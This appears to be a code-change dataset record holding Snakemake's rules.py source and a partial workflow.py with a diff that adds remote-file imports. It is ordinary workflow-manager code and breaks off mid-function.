def _set_inoutput_item(self, item, output=False, name=None): \"\"\" Set an item to be input or output. Arguments item --the item inoutput --either a Namedlist of input or output items name --an optional name for the item \"\"\" inoutput=self.output if output else self.input if isinstance(item, str): if isinstance(item, _IOFile): self.dependencies[item]=item.rule _item=IOFile(item, rule=self) if is_flagged(item, \"temp\"): if not output: raise SyntaxError(\"Only output files may be temporary\") self.temp_output.add(_item) if is_flagged(item, \"protected\"): if not output: raise SyntaxError(\"Only output files may be protected\") self.protected_output.add(_item) if is_flagged(item, \"touch\"): if not output: raise SyntaxError( \"Only output files may be marked for touching.\") self.touch_output.add(_item) if is_flagged(item, \"dynamic\"): if output: self.dynamic_output.add(_item) else: self.dynamic_input.add(_item) if is_flagged(item, \"subworkflow\"): if output: raise SyntaxError( \"Only input files may refer to a subworkflow\") else: self.subworkflow_input[_item]=item.flags[\"subworkflow\"] inoutput.append(_item) if name: inoutput.add_name(name) elif callable(item): if output: raise SyntaxError( \"Only input files can be specified as functions\") inoutput.append(item) if name: inoutput.add_name(name) else: try: start=len(inoutput) for i in item: self._set_inoutput_item(i, output=output) if name: inoutput.set_name(name, start, end=len(inoutput)) except TypeError: raise SyntaxError( \"Input and output files have to be specified as strings or lists of strings.\") @property def params(self): return self._params def set_params(self, *params, **kwparams): for item in params: self._set_params_item(item) for name, item in kwparams.items(): self._set_params_item(item, name=name) def _set_params_item(self, item, name=None): if isinstance(item, str) or callable(item): self.params.append(item) if name: self.params.add_name(name) else: try: start=len(self.params) for i in item: self._set_params_item(i) if name: self.params.set_name(name, start, end=len(self.params)) except TypeError: raise SyntaxError(\"Params have to be specified as strings.\") @property def log(self): return self._log def set_log(self, *logs, **kwlogs): for item in logs: self._set_log_item(item) for name, item in kwlogs.items(): self._set_log_item(item, name=name) def _set_log_item(self, item, name=None): if isinstance(item, str) or callable(item): self.log.append(IOFile(item, rule=self) if isinstance(item, str) else item) if name: self.log.add_name(name) else: try: start=len(self.log) for i in item: self._set_log_item(i) if name: self.log.set_name(name, start, end=len(self.log)) except TypeError: raise SyntaxError(\"Log files have to be specified as strings.\") def expand_wildcards(self, wildcards=None): \"\"\" Expand wildcards depending on the requested output or given wildcards dict. \"\"\" def concretize_iofile(f, wildcards): if not isinstance(f, _IOFile): return IOFile(f, rule=self) else: return f.apply_wildcards(wildcards, fill_missing=f in self.dynamic_input, fail_dynamic=self.dynamic_output) def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj, concretize=apply_wildcards, ruleio=None): for name, item in olditems.allitems(): start=len(newitems) is_iterable=True if callable(item): try: item=item(wildcards_obj) except(Exception, BaseException) as e: raise InputFunctionException(e, rule=self) if not_iterable(item): item=[item] is_iterable=False for item_ in item: if not isinstance(item_, str): raise RuleException( \"Input function did not return str or list of str.\", rule=self) concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ else: if not_iterable(item): item=[item] is_iterable=False for item_ in item: concrete=concretize(item_, wildcards) newitems.append(concrete) if ruleio is not None: ruleio[concrete]=item_ if name: newitems.set_name( name, start, end=len(newitems) if is_iterable else None) if wildcards is None: wildcards=dict() missing_wildcards=self.wildcard_names -set(wildcards.keys()) if missing_wildcards: raise RuleException( \"Could not resolve wildcards in rule{}:\\n{}\".format( self.name, \"\\n\".join(self.wildcard_names)), lineno=self.lineno, snakefile=self.snakefile) ruleio=dict() try: input=InputFiles() wildcards_obj=Wildcards(fromdict=wildcards) _apply_wildcards(input, self.input, wildcards, wildcards_obj, concretize=concretize_iofile, ruleio=ruleio) params=Params() _apply_wildcards(params, self.params, wildcards, wildcards_obj) output=OutputFiles(o.apply_wildcards(wildcards) for o in self.output) output.take_names(self.output.get_names()) dependencies={ None if f is None else f.apply_wildcards(wildcards): rule for f, rule in self.dependencies.items() } ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output))) log=Log() _apply_wildcards(log, self.log, wildcards, wildcards_obj, concretize=concretize_iofile) benchmark=self.benchmark.apply_wildcards( wildcards) if self.benchmark else None return input, output, params, log, benchmark, ruleio, dependencies except WildcardError as ex: raise RuleException( \"Wildcards in input, params, log or benchmark file of rule{} cannot be \" \"determined from output files:\\n{}\".format(self, str(ex)), lineno=self.lineno, snakefile=self.snakefile) def is_producer(self, requested_output): \"\"\" Returns True if this rule is a producer of the requested output. \"\"\" try: for o in self.products: if o.match(requested_output): return True return False except sre_constants.error as ex: raise IOFileException(\"{} in wildcard statement\".format(ex), snakefile=self.snakefile, lineno=self.lineno) except ValueError as ex: raise IOFileException(\"{}\".format(ex), snakefile=self.snakefile, lineno=self.lineno) def get_wildcards(self, requested_output): \"\"\" Update the given wildcard dictionary by matching regular expression output files to the requested concrete ones. Arguments wildcards --a dictionary of wildcards requested_output --a concrete filepath \"\"\" if requested_output is None: return dict() bestmatchlen=0 bestmatch=None for o in self.products: match=o.match(requested_output) if match: l=self.get_wildcard_len(match.groupdict()) if not bestmatch or bestmatchlen > l: bestmatch=match.groupdict() bestmatchlen=l return bestmatch @staticmethod def get_wildcard_len(wildcards): \"\"\" Return the length of the given wildcard values. Arguments wildcards --a dict of wildcards \"\"\" return sum(map(len, wildcards.values())) def __lt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp < 0 def __gt__(self, rule): comp=self.workflow._ruleorder.compare(self, rule) return comp > 0 def __str__(self): return self.name def __hash__(self): return self.name.__hash__() def __eq__(self, other): return self.name==other.name class Ruleorder: def __init__(self): self.order=list() def add(self, *rulenames): \"\"\" Records the order of given rules as rule1 > rule2 > rule3,... \"\"\" self.order.append(list(rulenames)) def compare(self, rule1, rule2): \"\"\" Return whether rule2 has a higher priority than rule1. \"\"\" for clause in reversed(self.order): try: i=clause.index(rule1.name) j=clause.index(rule2.name) comp=j -i if comp < 0: comp=-1 elif comp > 0: comp=1 return comp except ValueError: pass wildcard_cmp=rule2.has_wildcards() -rule1.has_wildcards() if wildcard_cmp !=0: return wildcard_cmp return 0 def __iter__(self): return self.order.__iter__() ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"},"\/snakemake\/workflow.py":{"changes":[{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]},{"diff":"\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd","add":1,"remove":1,"filename":"\/snakemake\/workflow.py","badparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"],"goodparts":["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if 